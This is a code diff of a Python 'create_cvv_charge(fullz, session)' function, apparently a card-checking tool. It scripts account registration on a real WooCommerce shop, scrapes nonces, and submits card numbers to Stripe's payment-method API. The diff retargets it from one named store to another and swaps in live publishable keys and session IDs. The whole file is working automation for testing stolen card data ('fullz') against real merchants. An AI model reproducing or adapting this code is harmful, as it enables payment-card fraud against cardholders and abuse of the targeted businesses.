@@ -34,23 +34,23 @@ async def create_cvv_charge(fullz , session):
 
 
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'dnt': '1',
-            'priority': 'u=0, i',
             'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
             'sec-gpc': '1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
         }
 
-        response = await session.get('https://aurellie-store.com/my-account/', headers=headers)
+        response = await session.get('https://mooretruckparts.com.au/my-account/', headers=headers)
 
 
         nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" /><')
@@ -60,29 +60,30 @@ async def create_cvv_charge(fullz , session):
 
 
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://mooretruckparts.com.au',
+            'Referer': 'https://mooretruckparts.com.au/my-account/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'dnt': '1',
-            'origin': 'https://aurellie-store.com',
-            'priority': 'u=0, i',
-            'referer': 'https://aurellie-store.com/my-account/',
             'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
             'sec-gpc': '1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
         }
 
         data = {
             'email': email,
-            'password': 'WLY6dWCBHrJTZlkjlk;w',
+            'password': 'fdhfghfgjdfjgfdg',
+            'mailchimp_woocommerce_newsletter': '1',
             'wc_order_attribution_source_type': 'typein',
             'wc_order_attribution_referrer': '(none)',
             'wc_order_attribution_utm_campaign': '(none)',
@@ -94,9 +95,9 @@ async def create_cvv_charge(fullz , session):
             'wc_order_attribution_utm_source_platform': '(none)',
             'wc_order_attribution_utm_creative_format': '(none)',
             'wc_order_attribution_utm_marketing_tactic': '(none)',
-            'wc_order_attribution_session_entry': 'https://aurellie-store.com/',
-            'wc_order_attribution_session_start_time': '2025-03-05 12:03:27',
-            'wc_order_attribution_session_pages': '8',
+            'wc_order_attribution_session_entry': 'https://mooretruckparts.com.au/',
+            'wc_order_attribution_session_start_time': '2025-03-07 08:56:08',
+            'wc_order_attribution_session_pages': '7',
             'wc_order_attribution_session_count': '1',
             'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'woocommerce-register-nonce': nonce,
@@ -104,80 +105,73 @@ async def create_cvv_charge(fullz , session):
             'register': 'Register',
         }
 
-        response = await session.post('https://aurellie-store.com/my-account/', headers=headers, data=data)
+        response = await session.post('https://mooretruckparts.com.au/my-account/', headers=headers, data=data)
 
 
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Referer': 'https://mooretruckparts.com.au/my-account/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+            'dnt': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-gpc': '1',
+        }
 
+        response = await session.get('https://mooretruckparts.com.au/my-account/', headers=headers)
+
+
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Referer': 'https://mooretruckparts.com.au/my-account/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+            'dnt': '1',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-gpc': '1',
+        }
+
+        response = await session.get('https://mooretruckparts.com.au/my-account/payment-methods/', headers=headers)
 
 
 
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Referer': 'https://mooretruckparts.com.au/my-account/payment-methods/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'dnt': '1',
-            'priority': 'u=0, i',
-            'referer': 'https://aurellie-store.com/my-account/',
             'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
             'sec-gpc': '1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
         }
 
-        response = await session.get('https://aurellie-store.com/my-account/', headers=headers)
+        response = await session.get('https://mooretruckparts.com.au/my-account/add-payment-method/', headers=headers)
 
-
-
-
-
-
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'dnt': '1',
-            'priority': 'u=0, i',
-            'referer': 'https://aurellie-store.com/my-account/',
-            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'sec-gpc': '1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-        }
-
-        response = await session.get('https://aurellie-store.com/my-account/payment-methods/', headers=headers)
-
-
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'dnt': '1',
-            'priority': 'u=0, i',
-            'referer': 'https://aurellie-store.com/my-account/payment-methods/',
-            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'sec-gpc': '1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-        }
-
-        response = await session.get('https://aurellie-store.com/my-account/add-payment-method/', headers=headers)
-        
 
 
         payment_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
@@ -202,6 +196,7 @@ async def create_cvv_charge(fullz , session):
             'sec-gpc': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
         }
+
         data={
         'type':'card',
         'card[number]':cc,
@@ -211,24 +206,22 @@ async def create_cvv_charge(fullz , session):
         'allow_redisplay':'unspecified',
         'billing_details[address][country]':'IN',
         'pasted_fields':'number',
-        'payment_user_agent':'stripe.js/39de0b7336; stripe-js-v3/39de0b7336; payment-element; deferred-intent',
-        'referrer':'https://aurellie-store.com',
-        'time_on_page':'56435',
-        'client_attribution_metadata[client_session_id]':'6d0f8fbf-209d-4ddf-aef5-d298407f0ca3',
+        'payment_user_agent':'stripe.js/14fdc586f6; stripe-js-v3/14fdc586f6; payment-element; deferred-intent',
+        'referrer':'https://mooretruckparts.com.au',
+        'time_on_page':'49881',
+        'client_attribution_metadata[client_session_id]':'b1962a5c-4101-4fec-9e39-5bbd18cee31c',
         'client_attribution_metadata[merchant_integration_source]':'elements',
         'client_attribution_metadata[merchant_integration_subtype]':'payment-element',
         'client_attribution_metadata[merchant_integration_version]':'2021',
         'client_attribution_metadata[payment_intent_creation_flow]':'deferred',
         'client_attribution_metadata[payment_method_selection_flow]':'merchant_specified',
         'guid':'fd286b17-3ad6-4186-8cd6-e30c9fb40054b2fc13',
-        'muid':'4b6420f1-7adb-432f-82c8-d022e115538d87c454',
-        'sid':'5821de0d-22e9-46ae-88e2-f01cbf19da7642b049',
-        'key':'pk_live_51EpKFnDIbM3UXlVoRew9BbM8JpxtboelfaqVfjryY3Mn06HsdNqdUXQ1CyV0d8dtybVtBFJ3qEFOuVD1r6P3utTj00ccHUJo3L',
+        'muid':'43bdf9ce-901e-4c4e-b27e-9de5fe4313754733c6',
+        'sid':'186a5cd7-ffd0-4828-ac22-37f9066d2344e024b8',
+        'key':'pk_live_51E8DVkChndEVEIPgg7ic3Q5wLpPCATsMKEMUITiJumFq7tgpF2dL8ZoPI5dDHtjSKZNCcyG5uileis8GPoy6DhZr00BymjyeIo',
         '_stripe_version':'2024-06-20',
         }
-
         response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-
 
 
 
@@ -239,31 +232,23 @@ async def create_cvv_charge(fullz , session):
              return response.text
 
 
-
-
-
-
-
-
-
-
         headers = {
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://mooretruckparts.com.au',
+            'Referer': 'https://mooretruckparts.com.au/my-account/add-payment-method/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+            'X-Requested-With': 'XMLHttpRequest',
             'dnt': '1',
-            'origin': 'https://aurellie-store.com',
-            'priority': 'u=1, i',
-            'referer': 'https://aurellie-store.com/my-account/add-payment-method/',
             'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
             'sec-gpc': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
         }
 
         params = {
@@ -277,14 +262,11 @@ async def create_cvv_charge(fullz , session):
             '_ajax_nonce': payment_nonce,
         }
 
-        response = await session.post('https://aurellie-store.com/', params=params, headers=headers, data=data)
-
-
+        response = await session.post('https://mooretruckparts.com.au/', params=params, headers=headers, data=data)
 
         print(response.text)
 
         return response.text
-
 
 
 
